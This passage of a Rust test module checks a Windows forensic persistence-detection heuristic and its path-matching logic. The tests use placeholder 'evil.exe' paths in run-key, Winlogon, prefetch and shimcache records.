        assert!(findings[0]
            .evidence
            .iter()
            .any(|e| e.artifact == "prefetch"));
        assert!(findings[0].evidence.iter().any(|e| e.artifact == "run_key"));
        assert!(findings[0]
            .reason
            .as_deref()
            .unwrap()
            .contains("corroborated"));
    }

    #[test]
    fn details_starts_with_full_path_and_title_names_binary() {
        let now = Utc::now();
        let records = vec![wrap(full_rec(
            "run_key",
            Some("U"),
            Some(r"C:\Users\a\AppData\Roaming\evil.exe"),
            Some(r"C:\Users\a\AppData\Roaming\evil.exe"),
            Some(false),
            Some(now),
        ))];
        let f = &PersistHeuristic.analyze(&records).unwrap()[0];
        assert!(
            f.details
                .starts_with(r"C:\Users\a\AppData\Roaming\evil.exe |"),
            "details must lead with the path: {}",
            f.details
        );
        assert!(f.title.contains("evil.exe"), "title: {}", f.title);
    }

    #[test]
    fn winlogon_default_is_observation_with_category() {
        let now = Utc::now();
        let records = vec![wrap(full_rec(
            "winlogon",
            Some("Shell"),
            Some("explorer.exe"),
            Some(r"C:\Windows\explorer.exe"),
            Some(true),
            Some(now),
        ))];
        assert!(PersistHeuristic.analyze(&records).unwrap().is_empty());
        let obs = PersistHeuristic.observe(&records).unwrap();
        assert_eq!(obs[0].category, "winlogon_default");
    }

    #[test]
    fn join_key_full_path_requires_path_match_not_just_basename() {
        // Two ProcessRecords with the same basename but different directories must
        // NOT be treated as the same join key when both sides have full paths.
        let a = join_key(r"C:\Windows\System32\evil.exe");
        let b = join_key(r"C:\Users\x\AppData\Local\Temp\evil.exe");
        assert_ne!(a, b, "same basename, different full paths must not collide");
    }

    #[test]
    fn join_key_full_path_matches_identical_path_case_insensitive() {
        let a = join_key(r"C:\Windows\System32\evil.exe");
        let b = join_key(r"c:\windows\system32\EVIL.EXE");
        assert_eq!(a, b, "identical path differing only by case must match");
    }

    #[test]
    fn join_key_name_only_source_degrades_to_basename_match() {
        // prefetch-style source: bare filename, no directory component.
        let prefetch_side = join_key("NOTEPAD.EXE");
        let live_side = join_key(r"C:\Windows\System32\notepad.exe");
        // Degraded match: both reduce to the same basename-level key.
        assert_eq!(
            prefetch_side.degraded_key(),
            live_side.degraded_key(),
            "basename-only source must still corroborate via degraded match"
        );
    }

    #[test]
    fn join_key_srum_id_fallback_is_name_only() {
        // srum's resolve_app_name falls back to "id:<n>" when unmapped — must be
        // treated as a Name key (no directory component), not misparsed as a path.
        let k = join_key("id:42");
        assert!(matches!(k, JoinKey::Name(_)), "id: fallback must be a Name key");
    }

    #[test]
    fn cross_index_full_paths_with_same_basename_never_collide_via_degraded() {
        // Regression for F-2 resurfacing: two ExecutionRecords both carry full paths
        // (e.g. shimcache/userassist) with the same basename but different directories.
        // Looking up one path must NOT return the other via the degraded (basename-only)
        // fallback — degraded matching is reserved for sources that never had a path
        // to begin with (JoinKey::Name), not for two full paths that merely disagree.
        let sys32 = ExecutionRecord {
            source: "shimcache".into(),
            path: r"C:\Windows\System32\evil.exe".into(),
            first_run: None,
            last_run: None,
            run_count: None,
            sha1: None,
            user_sid: None,
            execution_confirmed: Some(true),
        };
        let temp = ExecutionRecord {
            source: "shimcache".into(),
            path: r"C:\Users\alice\AppData\Local\Temp\evil.exe".into(),
            first_run: None,
            last_run: None,
            run_count: None,
            sha1: None,
            user_sid: None,
            execution_confirmed: Some(true),
        };
        let records = vec![
            Record::Execution(sys32.clone()),
            Record::Execution(temp.clone()),
        ];
        let idx = build_cross_index(&records);

        let (hits, degraded) = idx.lookup_exec(&join_key(r"C:\Windows\System32\evil.exe"));
        assert_eq!(hits.len(), 1, "must match only the exact path, not the temp twin");
        assert_eq!(hits[0].path, sys32.path);
        assert!(!degraded, "exact path match must not be flagged as degraded");

        let (hits, degraded) =
            idx.lookup_exec(&join_key(r"C:\Users\alice\AppData\Local\Temp\evil.exe"));
        assert_eq!(hits.len(), 1, "must match only the exact path, not the system32 twin");
        assert_eq!(hits[0].path, temp.path);
        assert!(!degraded);

        // A path with no exact match at all must return empty, not fall back to
        // basename-guessing against either full-path record above.
        let (hits, degraded) = idx.lookup_exec(&join_key(r"D:\Other\evil.exe"));
        assert!(hits.is_empty(), "unmatched full path must not degrade to basename guess");
        assert!(!degraded);
    }
}
